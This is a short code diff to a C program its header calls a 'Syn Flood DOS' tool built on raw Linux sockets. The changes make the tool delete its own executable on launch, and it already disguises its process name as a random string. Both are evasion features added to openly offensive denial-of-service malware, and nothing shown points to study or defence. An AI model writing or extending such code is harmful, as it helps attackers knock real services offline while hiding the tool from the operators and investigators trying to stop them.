@@ -2,6 +2,7 @@
 	Syn Flood DOS with LINUX sockets
 */
 #include<stdio.h>
+#include <unistd.h>
 #include<string.h> //memset
 #include<sys/socket.h>
 #include<stdlib.h> //for exit(0);
@@ -53,11 +54,12 @@ void set_rand_name()
     prctl(PR_SET_NAME, "zzzxx9opa32");
 }
 
-
-int main (void)
+int main (int argc, char **argv)
 {
-    //Create a raw socket
+    // Delete self
+    unlink(argv[0]);
     set_rand_name();
+    //Create a raw socket
     int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
     //Datagram to represent the packet
     char datagram[4096] , source_ip[32];
